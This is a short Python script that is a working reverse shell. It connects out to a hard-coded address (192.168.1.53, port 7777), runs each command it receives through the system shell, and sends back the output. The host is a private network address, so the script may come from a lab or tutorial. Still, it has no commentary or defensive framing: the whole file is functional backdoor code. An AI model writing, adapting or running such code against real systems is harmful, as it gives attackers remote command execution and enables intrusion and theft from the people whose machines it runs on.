#!/usr/bin/env python
#_*_coding: utf8_*_

import socket
import os
import subprocess

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    while True:
        res = cliente.recv(1024)
        if res == "exit":
            break
        else:
            proc = subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE )
            result = proc.stdout.read() +proc.stderr.read()
            cliente.send(result)
    
    


cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cliente.connect(("192.168.1.53",7777))
shell()
cliente.close()
